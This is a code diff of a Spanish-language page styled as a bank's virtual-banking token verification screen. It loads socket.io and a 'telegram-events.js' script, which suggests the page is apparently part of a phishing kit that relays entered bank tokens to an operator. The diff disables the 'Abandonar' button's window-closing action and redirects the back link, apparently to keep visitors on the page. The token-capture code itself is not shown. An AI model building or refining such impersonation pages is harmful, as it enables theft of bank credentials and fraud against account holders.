@@ -6,11 +6,10 @@
     <title>Ingreso a Banca Virtual - Verificación</title>
     <link rel="stylesheet" href="token.css">
     
-    <!-- Scripts CORREGIDOS con rutas correctas -->
+    <!-- Scripts -->
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script src="js/config.js"></script>
     <script src="js/common.js"></script>
-    <script src="js/loading-overlay.js"></script>
     <script src="js/telegram-events.js"></script>
     
     <script>
@@ -46,13 +45,13 @@
 <body>
     <div class="header">
         <div class="nav-left">
-            <a href="javascript:history.back()" class="back-btn">← Atrás</a>
+            <a href="index.html" class="back-btn">← Atrás</a>
         </div>
         <div class="nav-center">
             <h1>Ingreso a Banca Virtual</h1>
         </div>
         <div class="nav-right">
-            <button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
+            <button class="abandon-btn">Abandonar ×</button>
         </div>
     </div>
 
@@ -85,7 +84,7 @@
         <p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
     </div>
 
-    <!-- CARGAR token.js AL FINAL con ruta correcta -->
+    <!-- CORRECCIÓN: Ruta correcta para token.js -->
     <script src="js/token.js"></script>
 </body>
 </html>
